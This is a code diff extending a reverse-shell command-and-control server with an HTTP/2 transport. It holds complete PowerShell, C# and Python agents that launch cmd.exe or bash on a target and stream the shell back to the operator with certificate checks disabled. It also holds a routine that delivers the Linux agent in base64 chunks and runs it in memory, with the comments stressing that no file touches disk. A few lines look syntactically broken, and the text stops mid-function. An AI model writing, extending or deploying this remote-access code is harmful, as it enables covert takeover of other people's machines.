@@ -4,6 +4,7 @@ import datetime
 import hashlib
 import os
 import re
+import random
 import select
 import socket
 import ssl
@@ -15,6 +16,7 @@ from threading import Lock
 
 from .win_client import (
     infer_type_from_sysinfo,
+    make_probe_markers,
     probe_windows_platform,
     send_powershell_script,
     text_suggests_windows,
@@ -56,6 +58,621 @@ from .transfer import FileTransfer
 from .tunnel import TunnelManager
 from .updater import Updater
 from .plugins import PluginManager
+from .http2_transport import Http2Listener
+import secrets
+
+_HTTP2_AGENT_TEMPLATE = r'''
+$ErrorActionPreference = 'SilentlyContinue'
+$Url = '__H2_URL__'
+
+$__agent_code = @'
+$ErrorActionPreference = 'Stop'
+Add-Type -TypeDefinition @"
+using System;
+using System.IO;
+using System.Net;
+using System.Net.Http;
+using System.Threading.Tasks;
+
+public static class H2Pipe {
+    public class BlockingStream : Stream {
+        private readonly System.Collections.Concurrent.BlockingCollection<byte[]> _q
+            = new System.Collections.Concurrent.BlockingCollection<byte[]>();
+        private byte[] _cur; private int _pos;
+        public override bool CanRead => true;
+        public override bool CanSeek => false;
+        public override bool CanWrite => true;
+        public override long Length => throw new NotSupportedException();
+        public override long Position { get => 0; set => throw new NotSupportedException(); }
+        public override void Flush() { }
+        public override long Seek(long o, SeekOrigin s) => throw new NotSupportedException();
+        public override void SetLength(long v) => throw new NotSupportedException();
+        public override int Read(byte[] buf, int off, int len) {
+            if (_cur == null || _pos >= _cur.Length) { _cur = _q.Take(); _pos = 0; }
+            int n = Math.Min(len, _cur.Length - _pos);
+            Array.Copy(_cur, _pos, buf, off, n);
+            _pos += n;
+            return n;
+        }
+        public override void Write(byte[] buf, int off, int len) {
+            byte[] c = new byte[len];
+            Array.Copy(buf, off, c, 0, len);
+            _q.Add(c);
+        }
+    }
+
+    public static async Task Run(string url) {
+        var handler = new HttpClientHandler {
+            ServerCertificateCustomValidationCallback = (m, c, ch, e) => true,
+        };
+        using var client = new HttpClient(handler) {
+            DefaultRequestVersion = HttpVersion.Version20,
+            DefaultVersionPolicy  = HttpVersionPolicy.RequestVersionExact,
+            Timeout = System.Threading.Timeout.InfiniteTimeSpan,
+        };
+        client.DefaultRequestHeaders.Add("User-Agent",
+            "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 " +
+            "(KHTML, like Gecko) Chrome/120.0 Safari/537.36");
+
+        var up = new BlockingStream();
+        var content = new StreamContent(up);
+        var request = new HttpRequestMessage(HttpMethod.Post, url) { Content = content };
+        var response = await client.SendAsync(
+            request, HttpCompletionOption.ResponseHeadersRead);
+        response.EnsureSuccessStatusCode();
+        var down = await response.Content.ReadAsStreamAsync();
+
+        var psi = new System.Diagnostics.ProcessStartInfo {
+            FileName = "cmd.exe",
+            UseShellExecute = false,
+            RedirectStandardInput  = true,
+            RedirectStandardOutput = true,
+            RedirectStandardError  = true,
+            CreateNoWindow = true,
+        };
+        var proc = System.Diagnostics.Process.Start(psi);
+
+        var t1 = Task.Run(async () => {
+            var buf = new byte[4096]; int n;
+            while ((n = await down.ReadAsync(buf, 0, buf.Length)) > 0) {
+                await proc.StandardInput.BaseStream.WriteAsync(buf, 0, n);
+                await proc.StandardInput.BaseStream.FlushAsync();
+            }
+        });
+        var t2 = Task.Run(async () => {
+            var buf = new byte[4096]; int n;
+            while ((n = await proc.StandardOutput.BaseStream.ReadAsync(buf, 0, buf.Length)) > 0)
+                up.Write(buf, 0, n);
+        });
+        var t3 = Task.Run(async () => {
+            var buf = new byte[4096]; int n;
+            while ((n = await proc.StandardError.BaseStream.ReadAsync(buf, 0, buf.Length)) > 0)
+                up.Write(buf, 0, n);
+        });
+        await Task.WhenAll(t1, t2, t3);
+    }
+}
+"@ -Language CSharp
+
+[H2Pipe]::Run('__H2_URL__').GetAwaiter().GetResult()
+'@
+
+# Launch the agent as a detached background job so the shell
+# returns to its prompt immediately.
+$__job = Start-Job -ScriptBlock ([ScriptBlock]::Create($__agent_code)) `
+    -ErrorAction SilentlyContinue
+
+if ($__job) {
+    Write-Output ('H2_LAUNCHED:' + $__job.Id)
+} else {
+    Write-Output 'H2_LAUNCH_FAILED'
+}
+'''
+
+_HTTP2_AGENT_LINUX_PY = r'''
+import os, queue, signal, socket, ssl, subprocess, sys, threading, time
+
+HOST = "__H2_HOST__"
+PORT = __H2_PORT__
+PATH = "__H2_PATH__"
+
+try:
+    signal.signal(signal.SIGPIPE, signal.SIG_IGN)
+except Exception:
+    pass
+
+MODE = "h2"
+try:
+    import h2.config, h2.connection, h2.events
+except ImportError:
+    try:
+        subprocess.run(
+            [sys.executable, "-m", "pip", "install", "--quiet", "--user", "h2"],
+            check=False, timeout=60,
+            stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL,
+        )
+        import h2.config, h2.connection, h2.events
+    except Exception:
+        MODE = "h1"
+
+
+def _spawn_shell():
+    return subprocess.Popen(
+        ["/bin/bash", "--noprofile", "--norc"],
+        stdin=subprocess.PIPE, stdout=subprocess.PIPE,
+        stderr=subprocess.STDOUT, bufsize=0,
+        start_new_session=True,
+    )
+
+
+def _shutdown_socket(sock):
+    try:
+        sock.shutdown(socket.SHUT_RDWR)
+    except Exception:
+        pass
+    try:
+        sock.close()
+    except Exception:
+        pass
+
+
+# ------------------------------------------------------------------ h2 path
+
+def run_h2():
+    cfg = h2.config.H2Configuration(client_side=True, header_encoding="utf-8")
+    conn = h2.connection.H2Connection(config=cfg)
+
+    raw = socket.create_connection((HOST, PORT), timeout=30)
+    ctx = ssl.create_default_context()
+    ctx.check_hostname = False
+    ctx.verify_mode = ssl.CERT_NONE
+    try:
+        ctx.set_alpn_protocols(["h2"])
+    except Exception:
+        pass
+    sock = ctx.wrap_socket(raw, server_hostname=HOST)
+
+    try:
+        sock.settimeout(None)
+    except Exception:
+        pass
+    try:
+        sock.setsockopt(socket.SOL_SOCKET, socket.SO_KEEPALIVE, 1)
+    except Exception:
+        pass
+
+    conn.initiate_connection()
+    sock.sendall(conn.data_to_send())
+
+    sid = conn.get_next_available_stream_id()
+    conn.send_headers(sid, [
+        (":method", "POST"), (":path", PATH),
+        (":authority", HOST + ":" + str(PORT)), (":scheme", "https"),
+        ("content-type", "application/octet-stream"),
+        ("user-agent", "Mozilla/5.0 (X11; Linux x86_64)"),
+    ], end_stream=False)
+    sock.sendall(conn.data_to_send())
+
+    stop_evt      = threading.Event()
+    h2_lock       = threading.Lock()
+    pending_out   = []
+    window_updated = threading.Event()
+
+    # ---- shell lifecycle: reader + writer threads share this state ------
+    shell_state      = {'proc': None}
+    shell_spawn_lock = threading.Lock()
+    stdin_q          = queue.Queue(maxsize=8192)
+
+    def _spawn_shell_locked():
+        proc = _spawn_shell()
+        shell_state['proc'] = proc
+        threading.Thread(
+            target=shell_reader, args=(proc,), daemon=True,
+        ).start()
+        return proc
+
+    def _ensure_shell():
+        with shell_spawn_lock:
+            proc = shell_state['proc']
+            if proc is None or proc.poll() is not None:
+                rc = None if proc is None else proc.poll()
+                _spawn_shell_locked()
+            return shell_state['proc']
+
+    def shell_writer():
+        """Drain stdin_q into the current shell. This is the ONLY place
+        that ever writes to shell stdin. If the write fails, respawn."""
+        while not stop_evt.is_set():
+            try:
+                data = stdin_q.get(timeout=0.5)
+            except queue.Empty:
+                continue
+            if data is None:
+                return
+            while not stop_evt.is_set():
+                proc = _ensure_shell()
+                try:
+                    proc.stdin.write(data)
+                    proc.stdin.flush()
+                    break
+                except Exception as e:
+                    with shell_spawn_lock:
+                        if shell_state['proc'] is proc:
+                            try:
+                                proc.terminate()
+                            except Exception:
+                                pass
+                            shell_state['proc'] = None
+                    time.sleep(0.2)
+
+    def _drain_out():
+        while pending_out and not stop_evt.is_set():
+            try:
+                window = conn.local_flow_control_window(sid)
+            except Exception as e:
+                stop_evt.set()
+                return
+            if window <= 0:
+                return
+            head    = pending_out[0]
+            to_send = min(len(head), window, conn.max_outbound_frame_size)
+            try:
+                conn.send_data(sid, head[:to_send], end_stream=False)
+                sock.sendall(conn.data_to_send())
+            except Exception as e:
+                stop_evt.set()
+                return
+            if to_send >= len(head):
+                pending_out.pop(0)
+            else:
+                pending_out[0] = head[to_send:]
+
+    def shell_reader(proc):
+        """Read from ONE shell's stdout. Returns on EOF; the writer will
+        respawn (and start a new reader) when the next command arrives."""
+        try:
+            while not stop_evt.is_set():
+                try:
+                    data = os.read(proc.stdout.fileno(), 4096)
+                except Exception as e:
+                    return
+                if not data:
+                    return
+                with h2_lock:
+                    pending_out.append(data)
+                    _drain_out()
+                    has_more = bool(pending_out)
+                while has_more and not stop_evt.is_set():
+                    window_updated.wait(timeout=1.0)
+                    window_updated.clear()
+                    with h2_lock:
+                        _drain_out()
+                        has_more = bool(pending_out)
+        except Exception as e:
+
+    # Bootstrap the first shell + writer thread.
+    with shell_spawn_lock:
+        _spawn_shell_locked()
+    threading.Thread(target=shell_writer, daemon=True).start()
+
+    try:
+        while not stop_evt.is_set():
+            try:
+                data = sock.recv(65536)
+            except Exception as e:
+                break
+            if not data:
+                break
+
+            with h2_lock:
+                try:
+                    events = conn.receive_data(data)
+                except Exception as e:
+                    break
+                got_window_update = False
+                for ev in events:
+                    if isinstance(ev, h2.events.DataReceived):
+                        # NEVER touch shell.stdin from this thread.
+                        try:
+                            stdin_q.put_nowait(ev.data)
+                        except queue.Full:
+                                 % len(ev.data))
+                        try:
+                            conn.acknowledge_received_data(
+                                ev.flow_controlled_length, ev.stream_id)
+                        except Exception:
+                            pass
+                    elif isinstance(ev, h2.events.WindowUpdated):
+                        if ev.stream_id in (0, sid):
+                            got_window_update = True
+                    elif isinstance(ev, (h2.events.StreamEnded,
+                                         h2.events.StreamReset)):
+                             % type(ev).__name__)
+                        stop_evt.set()
+                        break
+                    elif isinstance(ev, h2.events.ConnectionTerminated):
+                        stop_evt.set()
+                        break
+
+                try:
+                    out = conn.data_to_send()
+                    if out:
+                        sock.sendall(out)
+                except Exception:
+                    stop_evt.set()
+                    break
+
+                if got_window_update:
+                    _drain_out()
+
+            if got_window_update:
+                window_updated.set()
+    finally:
+        stop_evt.set()
+        window_updated.set()
+        try:
+            stdin_q.put_nowait(None)
+        except Exception:
+            pass
+        with shell_spawn_lock:
+            proc = shell_state['proc']
+        if proc is not None:
+            try:
+                proc.terminate()
+            except Exception:
+                pass
+        try:
+            with h2_lock:
+                conn.end_stream(sid)
+                sock.sendall(conn.data_to_send())
+        except Exception:
+            pass
+        _shutdown_socket(sock)
+
+
+# ------------------------------------------------------------------ h1 path
+
+def run_h1():
+    raw = socket.create_connection((HOST, PORT), timeout=30)
+    ctx = ssl.create_default_context()
+    ctx.check_hostname = False
+    ctx.verify_mode = ssl.CERT_NONE
+    try:
+        ctx.set_alpn_protocols(["http/1.1"])
+    except Exception:
+        pass
+    sock = ctx.wrap_socket(raw, server_hostname=HOST)
+    try:
+        sock.settimeout(None)
+    except Exception:
+        pass
+    try:
+        sock.setsockopt(socket.SOL_SOCKET, socket.SO_KEEPALIVE, 1)
+    except Exception:
+        pass
+
+    sock.sendall((
+        f"POST {PATH} HTTP/1.1\r\n"
+        f"Host: {HOST}:{PORT}\r\n"
+        f"Content-Type: application/octet-stream\r\n"
+        f"Transfer-Encoding: chunked\r\n"
+        f"Connection: keep-alive\r\n\r\n"
+    ).encode())
+
+    buf = b""
+    while b"\r\n\r\n" not in buf:
+        d = sock.recv(4096)
+        if not d:
+            return
+        buf += d
+    head_end = buf.find(b"\r\n\r\n")
+    rest = buf[head_end + 4:]
+
+    shell = _spawn_shell()
+    send_lock = threading.Lock()
+    stop_evt = threading.Event()
+
+    def shell_reader(shell_ref):
+        try:
+            while not stop_evt.is_set():
+                try:
+                    data = os.read(shell_ref.stdout.fileno(), 4096)
+                except Exception:
+                    data = b""
+                if not data:
+                    return
+                with send_lock:
+                    try:
+                        chunk = f"{len(data):x}\r\n".encode() + data + b"\r\n"
+                        sock.sendall(chunk)
+                    except Exception:
+                        stop_evt.set()
+                        _shutdown_socket(sock)
+                        return
+        except Exception:
+            return
+
+    threading.Thread(target=shell_reader, args=(shell,), daemon=True).start()
+
+    rbuf = bytearray(rest)
+
+    def _recv_more():
+        try:
+            d = sock.recv(65536)
+        except Exception:
+            return False
+        if not d:
+            return False
+        rbuf.extend(d)
+        return True
+
+    try:
+        while not stop_evt.is_set():
+            nl = rbuf.find(b"\r\n")
+            while nl < 0:
+                if not _recv_more():
+                    stop_evt.set()
+                    return
+                nl = rbuf.find(b"\r\n")
+            size_hex = bytes(rbuf[:nl]).split(b";")[0].strip()
+            del rbuf[:nl + 2]
+            try:
+                size = int(size_hex, 16)
+            except ValueError:
+                stop_evt.set()
+                return
+            if size == 0:
+                stop_evt.set()
+                return
+            while len(rbuf) < size + 2:
+                if not _recv_more():
+                    stop_evt.set()
+                    return
+            payload = bytes(rbuf[:size])
+            del rbuf[:size + 2]
+            try:
+                shell.stdin.write(payload)
+                shell.stdin.flush()
+            except Exception:
+                try:
+                    shell.terminate()
+                except Exception:
+                    pass
+                shell = _spawn_shell()
+                threading.Thread(
+                    target=shell_reader,
+                    args=(shell,), daemon=True,
+                ).start()
+    finally:
+        stop_evt.set()
+        try:
+            shell.terminate()
+        except Exception:
+            pass
+        _shutdown_socket(sock)
+
+
+if __name__ == "__main__":
+    try:
+        if MODE == "h2":
+            run_h2()
+        else:
+            run_h1()
+    except Exception:
+        try:
+            if MODE == "h2":
+                run_h1()
+        except Exception:
+            pass
+'''
+
+_HTTP1_AGENT_PS = r'''
+$ErrorActionPreference = 'SilentlyContinue'
+$Url = '__H1_URL__'
+
+$__agent_code = @'
+$ErrorActionPreference = 'Stop'
+
+try {
+  [System.Net.ServicePointManager]::SecurityProtocol = `
+    [System.Net.SecurityProtocolType]::Tls12
+} catch {}
+try {
+  [System.Net.ServicePointManager]::ServerCertificateValidationCallback = `
+    { param($s,$c,$ch,$e) $true }
+} catch {}
+
+Add-Type -TypeDefinition @"
+using System;
+using System.IO;
+using System.Net;
+using System.Threading;
+using System.Threading.Tasks;
+
+public static class Http1Shell {
+    public static void Run(string url) {
+        var req = (HttpWebRequest)WebRequest.Create(url);
+        req.Method = "POST";
+        req.ContentType = "application/octet-stream";
+        req.SendChunked = true;
+        req.AllowWriteStreamBuffering = false;
+        req.Timeout = Timeout.Infinite;
+        req.ReadWriteTimeout = Timeout.Infinite;
+        req.Proxy = null;
+        req.KeepAlive = true;
+
+        Stream reqStream = req.GetRequestStream();
+        IAsyncResult asyncResp = req.BeginGetResponse(null, null);
+
+        var psi = new System.Diagnostics.ProcessStartInfo {
+            FileName = "cmd.exe",
+            UseShellExecute = false,
+            RedirectStandardInput  = true,
+            RedirectStandardOutput = true,
+            RedirectStandardError  = true,
+            CreateNoWindow = true,
+        };
+        var proc = System.Diagnostics.Process.Start(psi);
+
+        object writeLock = new object();
+
+        var tA = Task.Run(() => {
+            try {
+                while (!asyncResp.IsCompleted) Thread.Sleep(20);
+                var resp = (HttpWebResponse)req.EndGetResponse(asyncResp);
+                Stream rs = resp.GetResponseStream();
+                byte[] buf = new byte[4096];
+                int n;
+                while ((n = rs.Read(buf, 0, buf.Length)) > 0) {
+                    proc.StandardInput.BaseStream.Write(buf, 0, n);
+                    proc.StandardInput.BaseStream.Flush();
+                }
+            } catch {}
+        });
+
+        var tB = Task.Run(() => {
+            try {
+                byte[] buf = new byte[4096];
+                int n;
+                while ((n = proc.StandardOutput.BaseStream.Read(buf, 0, buf.Length)) > 0) {
+                    lock (writeLock) {
+                        reqStream.Write(buf, 0, n);
+                        reqStream.Flush();
+                    }
+                }
+            } catch {}
+        });
+
+        var tC = Task.Run(() => {
+            try {
+                byte[] buf = new byte[4096];
+                int n;
+                while ((n = proc.StandardError.BaseStream.Read(buf, 0, buf.Length)) > 0) {
+                    lock (writeLock) {
+                        reqStream.Write(buf, 0, n);
+                        reqStream.Flush();
+                    }
+                }
+            } catch {}
+        });
+
+        Task.WaitAll(tA, tB, tC);
+    }
+}
+"@ -Language CSharp
+
+[Http1Shell]::Run('__H1_URL__')
+'@
+
+$__job = Start-Job -ScriptBlock ([ScriptBlock]::Create($__agent_code)) `
+    -ErrorAction SilentlyContinue
+
+if ($__job) {
+    Write-Output ('H2_LAUNCHED:' + $__job.Id)
+} else {
+    Write-Output 'H2_LAUNCH_FAILED'
+}
+'''
 
 def _detect_mtls(client_sock):
     if not isinstance(client_sock, ssl.SSLSocket):
@@ -67,6 +684,7 @@ def _detect_mtls(client_sock):
 
 class TORNADOREVC2:
     def __init__(self, host='0.0.0.0', revshell_port=4444, tls_port=8443, mtls_port=9443,
+                 h2_port=None,
                  certfile=os.path.join('tls_certs', 'server.pem'),
                  keyfile=os.path.join('tls_certs', 'server.key'),
                  mtls_ca_cert=os.path.join('mtls_certs', 'ca.pem'),
@@ -79,6 +697,10 @@ class TORNADOREVC2:
         self.revshell_port = revshell_port
         self.tls_port = tls_port
         self.mtls_port = mtls_port
+        self.h2_port = h2_port
+        # token -> primary shell socket, populated by http2switch and
+        # consumed by attach_http2_transport().
+        self._h2_pending = {}
         self.certfile = certfile
         self.keyfile = keyfile
         self.mtls_ca_cert = mtls_ca_cert
@@ -104,6 +726,7 @@ class TORNADOREVC2:
         self._tcp_server = None
         self._tls_server = None
         self._mtls_server = None
+        self._h2_listener = None
         self.colors = {
             'cyan': '\033[96m', 'green': '\033[92m', 'yellow': '\033[93m',
             'red': '\033[91m', 'bold': '\033[1m', 'end': '\033[0m', 'blue': '\033[94m',
@@ -138,13 +761,19 @@ class TORNADOREVC2:
 
     def get_client_count(self):
         with self.client_lock:
+            seen  = set()
             alive = 0
-            for sock in list(self.revshell_clients.keys()):
+            for sock, info in list(self.revshell_clients.items()):
                 try:
-                    if sock.fileno() != -1:
-                        alive += 1
+                    if sock.fileno() == -1:
+                        continue
                 except Exception:
-                    pass
+                    continue
+                sid = info.get('id')
+                if sid is None or sid in seen:
+                    continue
+                seen.add(sid)
+                alive += 1
             return alive
 
     def _client_info(self, client_sock):
@@ -203,15 +832,15 @@ class TORNADOREVC2:
         return len(words) - 1
 
     def _get_client_ids(self):
-        ids = []
+        ids    = set()
         with self.client_lock:
             for sock, info in self.revshell_clients.items():
                 try:
                     if sock.fileno() != -1:
-                        ids.append(str(info['id']))
+                        ids.add(str(info['id']))
                 except Exception:
                     pass
-        return ids
+        return sorted(ids)
 
     def _complete_paths(self, text):
         raw = os.path.expanduser(text or '')
@@ -355,6 +984,13 @@ class TORNADOREVC2:
         context = ssl.SSLContext(ssl.PROTOCOL_TLS_SERVER)
         context.load_cert_chain(certfile=self.certfile, keyfile=self.keyfile)
         context.minimum_version = ssl.TLSVersion.TLSv1_2
+        # Prefer TLS 1.3 when both ends support it; the min stays at 1.2
+        # so older clients still negotiate. No behavior change on targets
+        # that only speak 1.2.
+        try:
+            context.maximum_version = ssl.TLSVersion.TLSv1_3
+        except AttributeError:
+            pass
         context.set_ciphers(
             "ECDHE-ECDSA-AES256-GCM-SHA384:"
             "ECDHE-RSA-AES256-GCM-SHA384:"
@@ -473,6 +1109,10 @@ class TORNADOREVC2:
         context.check_hostname = False
         context.load_verify_locations(cafile=self.mtls_ca_cert)
         context.minimum_version = ssl.TLSVersion.TLSv1_2
+        try:
+            context.maximum_version = ssl.TLSVersion.TLSv1_3
+        except AttributeError:
+            pass
         context.set_ciphers(
             "ECDHE-ECDSA-AES256-GCM-SHA384:"
             "ECDHE-RSA-AES256-GCM-SHA384:"
@@ -493,10 +1133,56 @@ class TORNADOREVC2:
     def send_to_revshell(self, client_sock, cmd):
         try:
             client_sock.sendall((cmd + "\n").encode())
-            return True
-        except Exception:
+        except Exception as exc:
+            # Secondary transports are torn down by the HTTP listener.
+            # Do not kill the bridge from here — a transient send error
+            # (EINTR, brief back-pressure, TLS rekey) must not tear down
+            # the session's only live transport.
+            if self._is_secondary_transport(client_sock):
+                print(f"{self.colors['yellow']}[transport] send failed on "
+                      f"secondary transport: {type(exc).__name__}: {exc}"
+                      f"{self.colors['end']}")
+                return False
             self.cleanup_client(client_sock)
             return False
+
+        # Record which transport handled this send, so `transport <ID>` and
+        # the session log show the truth, not just the handler's intent.
+        info = self._client_info(client_sock)
+        if info is not None:
+            transports = info.get('transports') or {}
+            if transports.get('shell') is client_sock:
+                label = 'shell'
+            elif transports.get('http2') is client_sock:
+                label = 'http2'
+            else:
+                label = 'unknown'
+            info['last_send_via'] = label
+            try:
+                info['last_send_addr'] = client_sock.getpeername()
+            except Exception:
+                info['last_send_addr'] = None
+            logger = info.get('logger')
+            if logger and label in ('shell', 'http2'):
+                try:
+                    logger.log_event(
+                        f"cmd[{label}] {cmd[:120]}{'…' if len(cmd) > 120 else ''}"
+                    )
+                except Exception:
+                    pass
+        return True
+
+    def _is_secondary_transport(self, client_sock):
+        """True if client_sock is not the primary shell socket."""
+        info = self._client_info(client_sock)
+        if not info:
+            return False
+        tr = info.get('transports') or {}
+        if tr.get('http2') is client_sock:
+            return True
+        if tr.get('shell') is not client_sock:
+            return True
+        return False
 
     def recv_output(self, client_sock, timeout=1.0, until_marker=None):
         data = b""
@@ -513,7 +1199,12 @@ class TORNADOREVC2:
                     break
                 chunk = client_sock.recv(65536)
                 if not chunk:
-                    self.cleanup_client(client_sock)
+                    # Never tear down a secondary transport from here — the
+                    # HTTP listener owns its lifecycle (StreamEnded /
+                    # StreamReset / connection teardown). A transient empty
+                    # read on a socketpair is not a session disconnect.
+                    if not self._is_secondary_transport(client_sock):
+                        self.cleanup_client(client_sock)
                     return ""
                 data += chunk
                 if until_marker and until_marker.encode() in data:
@@ -522,7 +1213,10 @@ class TORNADOREVC2:
                 if not until_marker:
                     deadline = min(deadline, time.time() + 0.3)
             except Exception:
-                self.cleanup_client(client_sock)
+                # Same rule: only the primary shell is cleaned up here.
+                # Secondary transports are torn down by the listener.
+                if not self._is_secondary_transport(client_sock):
+                    self.cleanup_client(client_sock)
                 return ""
         return data.decode(errors="ignore")
 
@@ -625,7 +1319,19 @@ class TORNADOREVC2:
                 if not r:
                     break
                 if not client_sock.recv(65536):
-                    self.cleanup_client(client_sock)
+                    # Only clean up the primary shell here. Secondary
+                    # transports are torn down by the HTTP listener
+                    # itself (StreamEnded / connection teardown).
+                    info = self._client_info(client_sock)
+                    is_secondary = False
+                    if info:
+                        tr = info.get('transports') or {}
+                        if tr.get('http2') is client_sock:
+                            is_secondary = True
+                        elif tr.get('shell') is not client_sock:
+                            is_secondary = True
+                    if not is_secondary:
+                        self.cleanup_client(client_sock)
                     break
             except Exception:
                 break
@@ -683,11 +1389,540 @@ class TORNADOREVC2:
         return payload
 
     def _get_client_by_id(self, client_id):
+        """
+        Return the active transport socket for a logical session.
+
+        Candidates are tried in order:
+        1. the transport marked active_transport, if its fileno is valid
+        2. the other secondary transport, if it is still alive
+        3. the primary shell socket, if it is still alive
+        The first candidate with a valid fileno wins.
+        """
+        info = None
+        with self.client_lock:
+            for _sock, cand in self.revshell_clients.items():
+                if cand.get('id') == client_id:
+                    info = cand
+                    break
+        if info is None:
+            return None
+
+        active     = info.get('active_transport', 'shell')
+        transports = dict(info.get('transports') or {})
+        primary    = info.get('sock')
+
+        candidates = []
+        t = transports.get(active)
+        if t is not None:
+            candidates.append(t)
+        for key in ('shell', 'http2'):
+            t = transports.get(key)
+            if t is not None and t not in candidates:
+                candidates.append(t)
+        if primary is not None and primary not in candidates:
+            candidates.append(primary)
+
+        for t in candidates:
+            try:
+                if t.fileno() != -1:
+                    return t
+            except Exception:
+                continue
+        return None
+
+    def attach_http2_transport(self, bridge, addr, token):
+        """Called by Http2Listener when a new /c2/<token> stream arrives."""
+        with self.client_lock:
+            primary_sock = self._h2_pending.pop(token, None)
+        if primary_sock is None:
+            try:
+                bridge.close()
+            except Exception:
+                pass
+            print(
+                f"{self.colors['yellow']}[H2] Unknown token {token!r} — "
+                f"stream rejected{self.colors['end']}"
+            )
+            return
+
+        info = self._client_info(primary_sock)
+        if info is None:
+            try:
+                bridge.close()
+            except Exception:
+                pass
+            return
+
+        # Register the bridge under the same info dict so lookups work.
+        info['transports']['http2'] = bridge
+        info['active_transport']    = 'http2'
+        info['h2_token']            = None
+        with self.client_lock:
+            self.revshell_clients[bridge] = info
+
+        display = info['name'] if info.get('name') else f"#{info['id']}"
+        print(
+            f"{self.colors['green']}[H2] HTTP/2 transport attached to "
+            f"{display} from {addr[0]}:{addr[1]} — active transport is now "
+            f"http2{self.colors['end']}"
+        )
+        logger = info.get('logger')
+        if logger:
+            logger.log_event(f"HTTP/2 transport attached from {addr[0]}:{addr[1]}")
+
+    def _http2_payload(self, url):
+        """Return the PowerShell source for the target-side HTTP/2 agent."""
+        return _HTTP2_AGENT_TEMPLATE.replace('__H2_URL__', url)
+
+    def _http2_payload_linux(self, host, port, token):
+        """Return a base64-encoded Python agent for Linux targets."""
+        import base64 as _b64
+        src = (
+            _HTTP2_AGENT_LINUX_PY
+            .replace('__H2_HOST__', host)
+            .replace('__H2_PORT__', str(port))
+            .replace('__H2_PATH__', f'/c2/{token}')
+        )
+        return _b64.b64encode(src.encode('utf-8')).decode('ascii')
+
+    def _resolve_bind_ip(self, spec):
+        """
+        Resolve an interface name or IP address to a concrete IPv4 address.
+
+        - None or empty        → '0.0.0.0'
+        - '10.10.14.7'         → '10.10.14.7'  (returned as-is)
+        - 'tun0' / 'eth0'      → the interface's IPv4 address
+        - unknown interface    → None
+
+        Tries psutil, then `ip -4 addr show <iface>`, then `ifconfig <iface>`.
+        Returns None if the interface cannot be resolved.
+        """
+        if not spec:
+            return '0.0.0.0'
+        if re.match(r'^\d+\.\d+\.\d+\.\d+$', spec):
+            return spec
+
+        try:
+            import psutil
+            for iface, addrs in psutil.net_if_addrs().items():
+                if iface == spec:
+                    for a in addrs:
+                        if a.family == socket.AF_INET:
+                            return a.address
+        except Exception:
+            pass
+
+        try:
+            result = subprocess.run(
+                ['ip', '-4', '-o', 'addr', 'show', spec],
+                capture_output=True, text=True, timeout=3,
+            )
+            if result.returncode == 0:
+                for line in result.stdout.splitlines():
+                    parts = line.split()
+                    if len(parts) >= 4 and parts[2] == 'inet':
+                        return parts[3].split('/')[0]
+        except Exception:
+            pass
+
+        try:
+            result = subprocess.run(
+                ['ifconfig', spec],
+                capture_output=True, text=True, timeout=3,
+            )
+            if result.returncode == 0:
+                m = re.search(r'inet\s+(?:addr:)?(\d+\.\d+\.\d+\.\d+)',
+                            result.stdout)
+                if m:
+                    return m.group(1)
+        except Exception:
+            pass
+
+        return None
+
+
+    def _pick_default_outbound_ip(self, target_host):
+        """
+        Return the local IP that would be used to reach target_host.
+        Falls back to None if the kernel cannot decide.
+        """
+        try:
+            s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
+            s.settimeout(2.0)
+            s.connect((target_host, 1))
+            ip = s.getsockname()[0]
+            s.close()
+            return ip
+        except Exception:
+            return None
+
+    def _deliver_http2_linux(self, primary_sock, host, port, token):
+        """
+        Deliver the Linux HTTP/2 agent entirely in memory.
+
+        The Python source is base64-encoded, accumulated into a shell
+        variable across multiple PTY-safe chunks, then decoded and piped
+        straight into `python3 -` via stdin. No file ever touches disk —
+        not even for a fraction of a second.
+
+        Process isolation:
+          - `setsid` puts the agent in its own session, so it is immune to
+            SIGHUP and to signals aimed at the reverse shell's process
+            group (which is what killed the previous agent whenever a
+            long-running command was typed into the interactive shell).
+          - stdout/stderr go to /dev/null so nothing is written back to
+            the operator's terminal or to any file on the target.
+          - the shell variable holding the base64 is unset immediately
+            after launch, so it does not linger in the shell's memory.
+
+        Returns True if the launch command was sent, False on write failure.
+        """
+        b64 = self._http2_payload_linux(host, port, token)
+
+        # Shell variable we will grow one chunk at a time. The variable
+        # name is intentionally short and unlikely to collide with
+        # anything the operator has already defined.
+        var = "_h2b64"
+
+        # Step 1 — initialise (and if a previous attempt left it set,
+        # clear it) the variable. Single quotes for the empty string.
+        if not self.send_to_revshell(primary_sock, f"{var}=''"):
+            return False
+        self.recv_output(primary_sock, timeout=0.5)
+
+        # Step 2 — append base64 chunks. 500 chars keeps every command
+        # well under the PTY canonical input buffer (typically 4095),
+        # even after the wrapper syntax is added.
+        #
+        #     VAR="$VAR"'newpiece'
+        #
+        # concatenates without a space, preserving the base64 stream.
+        CHUNK = 500
+        for i in range(0, len(b64), CHUNK):
+            piece = b64[i:i + CHUNK]
+            if not self.send_to_revshell(
+                primary_sock, f"{var}=\"${var}\"'{piece}'"
+            ):
+                return False
+            self.recv_output(primary_sock, timeout=0.4)
+
+        # Step 3 — decode and execute in one shot, in memory.
+        #
+        #   printf '%s' "$VAR"      → emit the base64
+        #   | base64 -d             → decode to Python source
+        #   | setsid python3 -      → read source from stdin and run it
+        #   >/dev/null 2>&1         → swallow all output
+        #   &                       → background the whole pipeline
+        #   unset VAR               → scrub the base64 from shell memory
+        #   echo H2_LAUNCHED        → marker the operator can grep for
+        #
+        # Double quotes around "$VAR" are safe: base64 alphabet is
+        # [A-Za-z0-9+/=], none of which the shell interprets.
+        launch = (
+            f"printf '%s' \"${var}\" | base64 -d | "
+            f"setsid python3 - >/dev/null 2>&1 & "
+            f"unset {var}; "
+            f"echo H2_LAUNCHED"
+        )
+        return self.send_to_revshell(primary_sock, launch)
+
+    def _h2_preflight(self, info):
+        """
+        Return (mode, detail):
+        mode = 'h2'    → use HTTP/2 (PS 7+ or Linux)
+        mode = 'h1'    → use HTTP/1.1 chunked (PS 5.x)
+        mode = None    → target unsuitable
+        """
+        kind = (info.get('type') or '').lower()
+        sock = info.get('sock')
+        if not sock:
+            return None, 'no primary transport'
+
+        if kind != 'windows':
+            # Linux/Unix: the agent needs python3. h2 auto-installs via pip
+            # if absent; if both are missing we still try, but flag it.
+            check = (
+                "command -v python3 >/dev/null && echo PY3 || echo NOPY; "
